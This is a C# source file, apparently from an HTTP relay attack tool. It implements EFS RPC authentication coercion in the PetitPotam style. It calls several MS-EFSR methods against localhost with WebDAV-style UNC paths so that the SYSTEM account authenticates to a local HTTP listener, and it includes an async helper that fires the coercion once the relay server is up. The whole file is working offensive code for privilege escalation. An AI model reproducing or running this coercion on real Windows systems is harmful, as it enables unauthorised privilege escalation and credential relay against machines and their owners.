using Httprelayserver.EfsTrigger;

namespace Httprelayserver.AuthTrigger
{
    public static class EfsTrigger
    {

        public enum ApiCall
        {
            EfsRpcEncryptFileSrv,
            EfsRpcDecryptFileSrv,
            EfsRpcQueryRecoveryAgents,
            EfsRpcQueryUsersOnFile,
            EfsRpcRemoveUsersFromFile
        }

        public static bool Trigger(int port, ApiCall apiCall = ApiCall.EfsRpcEncryptFileSrv)
        {
            Console.WriteLine("[+] Coercing System Authentication");
            int result;
            string target = "127.0.0.1";
            string listener = "localhost";

            var Efs = new Efs();
            IntPtr hHandle = IntPtr.Zero;

            try
            {
                switch (apiCall)
                {
                    case ApiCall.EfsRpcEncryptFileSrv:
                        Console.WriteLine("Trying to coerce by calling EfsRpcEncryptFileSrv ");
                        result = Efs.EfsRpcEncryptFileSrv(target, $"\\\\localhost@{port}/asdf\\test\\Settings.ini");
                        break;

                    case ApiCall.EfsRpcDecryptFileSrv:
                        result = Efs.EfsRpcDecryptFileSrv(target, $"\\\\{listener}@{port}/asdf\\test\\Settings.ini", 0);
                        break;

                    case ApiCall.EfsRpcQueryRecoveryAgents:
                        result = Efs.EfsRpcQueryRecoveryAgents(target, $"\\\\{listener}@{port}/asdf\\test\\Settings.ini", out hHandle);
                        break;

                    case ApiCall.EfsRpcQueryUsersOnFile:
                        result = Efs.EfsRpcQueryUsersOnFile(target, $"\\\\{listener}@{port}/asdf\\test\\Settings.ini", out hHandle);
                        break;

                    case ApiCall.EfsRpcRemoveUsersFromFile:
                        result = Efs.EfsRpcRemoveUsersFromFile(target, $"\\\\{listener}@{port}/asdf\\test\\Settings.ini", out hHandle);
                        break;

                    default:
                        result = Efs.EfsRpcOpenFileRaw(target, out hHandle, $"\\\\{listener}@{port}/asdf\\test\\Settings.ini", 0);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                return false;
            }
            return true;
        }

        /// <summary>
        /// Trigger EFS authentication coercion asynchronously
        /// </summary>
        public static async Task<bool> TriggerAsync(int httpPort, int delayMs = 2000)
        {
            return await Task.Run(() =>
            {
                if (delayMs > 0)
                {
                    Console.WriteLine($"[*] Waiting {delayMs}ms for HTTP server to start...");
                    Thread.Sleep(delayMs);
                }
                return Trigger(httpPort);
            });
        }
    }
}
